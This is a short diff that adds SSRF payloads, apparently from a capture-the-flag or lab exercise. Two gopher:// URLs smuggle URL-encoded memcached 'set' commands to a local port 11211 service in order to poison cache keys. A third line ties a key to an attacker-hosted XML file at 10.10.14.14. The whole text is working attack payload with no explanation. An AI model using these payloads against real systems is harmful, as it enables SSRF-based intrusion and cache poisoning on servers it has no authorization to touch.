@@ -1,0 +1,6 @@
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0acool%0d%0a
+
+http://10.10.14.14/xx.xml : xct_bd73697893b91e7eacd5c0ec1982a8a3
+
+
+gopher://127.0.1:11211/_%0d%0aset%20xct_bd73697893b91e7eacd5c0ec1982a8a3%204%200%204%0d%0acool%0d%0a
